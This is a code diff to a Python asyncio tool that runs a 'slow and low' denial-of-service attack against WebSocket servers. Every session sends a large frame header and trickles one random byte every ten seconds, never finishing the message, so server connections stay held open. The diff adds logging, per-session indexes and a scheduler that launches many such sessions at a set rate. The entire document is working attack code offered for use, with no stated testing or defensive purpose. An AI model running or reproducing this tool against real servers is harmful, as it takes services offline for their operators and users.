@@ -1,16 +1,23 @@
 #!/usr/bin/env python3
 
+import logging
 import os
 import random
 import asyncio
 import ssl
 
 from .websocket_protocol import (
-    WebSocketClientHandshake, WebSocketFrameHeader, websocket_mask,
-    pack_2bytes, pack_8bytes, unpack_2bytes, unpack_8bytes)
+    WSMessageType,
+    WebSocketClientHandshake,
+    WebSocketFrameHeader,
+    websocket_mask,
+    pack_2bytes,
+    pack_8bytes,
+    unpack_2bytes,
+    unpack_8bytes)
 
 
-async def _connect(host, port, use_tls):
+async def _connect(host, port, use_tls, index):
     if use_tls:
         context = ssl.create_default_context()
         context.check_hostname = False
@@ -21,13 +28,13 @@ async def _connect(host, port, use_tls):
     try:
         future = asyncio.open_connection(host, port, ssl=context)
         reader, writer = await asyncio.wait_for(future, timeout=10)
-        print('success connect to', host, port)
+        logging.info(f'{index}: success connect to {host}:{port}')
         return reader, writer
 
     # except (asyncio.TimeoutError, ConnectionRefusedError) as e:
     except Exception as e:
-        print('failed connect to', host, port, str(e))
-        return None, None
+        logging.error(f'{index}: failed connect to {host}:{port}')
+        raise
 
 
 async def _send_message(writer, data, opcode):
@@ -67,13 +74,13 @@ async def _receive_message(reader):
         msg_len = frame.length
 
     data = await reader.readexactly(msg_len)
-    print('received opcode', frame.opcode)
-    print('received length', msg_len)
+    logging.debug(f'received opcode {frame.opcode}')
+    logging.debug(f'received length {msg_len}')
     if msg_len < 100:
-        print('received data', data)
+        logging.debug(f'received data {data}')
 
     if frame.opcode == WebSocketFrameHeader.OPCODE_CLOSE and msg_len == 2:
-        print('received close reason', unpack_2bytes(data))
+        logging.info(f'received close reason {unpack_2bytes(data)}')
 
 
 async def _close_websocket(writer):
@@ -91,7 +98,7 @@ async def _handshake(reader, writer, host, port, path):
     ws.receive_handshake_response(data)
 
 
-async def _slow_and_low(writer, total_length, message_type):
+async def _slow_and_low(writer, total_length, message_type, index):
     """
     Send a big chunk first, then send small data at slow speed.
     """
@@ -101,7 +108,7 @@ async def _slow_and_low(writer, total_length, message_type):
 
     msg_len = total_length
 
-    if message_type == 'text':
+    if message_type == WSMessageType.TEXT:
         opcode = WebSocketFrameHeader.OPCODE_TEXT
     else:
         opcode = WebSocketFrameHeader.OPCODE_BINARY
@@ -118,7 +125,7 @@ async def _slow_and_low(writer, total_length, message_type):
 
     writer.write(header)
 
-    print('Start slow and low attack...')
+    logging.info(f'{index}: start slow and low attack...')
 
     # did not found a way to detect whether the connection is closed or not...
     size_sent = 0
@@ -132,13 +139,14 @@ async def _slow_and_low(writer, total_length, message_type):
         if size_sent > total_length - 10000:
             break
 
-    print('sent data size', size_sent)
+    logging.info(f'{index}: sent data size {size_sent}')
 
     # don't send the last 10 bytes, so the message will never be delivered
     slow_round = msg_len - size_sent - 10
-    print('send 1 byte every 10s to keep alive for {} round'.format(slow_round))
+    logging.info(f'{index}: send 1 byte every 10 second to keep alive for {slow_round} round')
 
     for _i in range(slow_round):
+        logging.debug(f'{index}: send 1 byte and sleep...')
         data = os.urandom(1)
         writer.write(data)
         await asyncio.sleep(10)
@@ -148,46 +156,53 @@ async def _read_and_discard(reader):
     _data = await reader.read(1024)
     while _data:
         _data = await reader.read(1024)
-        # print(_data)
+        # logging.debug(_data)
 
 
-async def _attack(host, port, path, length, message_type, use_tls):
-    reader, writer = await _connect(host, port, use_tls)
+async def _attack(host, port, path, length, message_type, use_tls, index):
+    reader, writer = await _connect(host, port, use_tls, index)
     await _handshake(reader, writer, host, port, path)
 
     asyncio.ensure_future(_read_and_discard(reader))
-    await _slow_and_low(writer, length, message_type)
+    await _slow_and_low(writer, length, message_type, index)
 
 
 async def _test(host, port, path, length, message_type, use_tls):
-    reader, writer = await _connect(host, port, use_tls)
+    reader, writer = await _connect(host, port, use_tls, 0)
     await _handshake(reader, writer, host, port, path)
 
-    if message_type == 'text':
+    if message_type == WSMessageType.TEXT:
         opcode = WebSocketFrameHeader.OPCODE_TEXT
         data = os.urandom(length//2+1).hex()[:length].encode('ascii')
     else:
         opcode = WebSocketFrameHeader.OPCODE_BINARY
         data = os.urandom(length)
 
-    print('sent length', len(data))
+    logging.info(f'sent length {len(data)}')
     if length < 100:
-        print('sent data', data)
+        logging.debug(f'sent data {data}')
 
     await _send_message(writer, data, opcode)
     await _receive_message(reader)
     await _close_websocket(writer)
 
 
-def attack(host, port, path, length, number, message_type='text', use_tls=False):
+async def _schedule(host, port, path, length, session, message_type, use_tls, rate):
+
+    for i in range(session):
+        attack_task = _attack(host, port, path, length, message_type, use_tls, i)
+        asyncio.ensure_future(attack_task)
+        await asyncio.sleep(1/rate)
+
+
+def attack(host, port, path, length, session, message_type=WSMessageType.TEXT, use_tls=False, rate=10):
     """
     Send flood messages with specified length.
     """
 
     loop = asyncio.get_event_loop()
 
-    for _i in range(number):
-        attack_task = _attack(host, port, path, length, message_type, use_tls)
-        asyncio.ensure_future(attack_task)
+    attack_task = _schedule(host, port, path, length, session, message_type, use_tls, rate)
+    asyncio.ensure_future(attack_task)
 
     loop.run_forever()
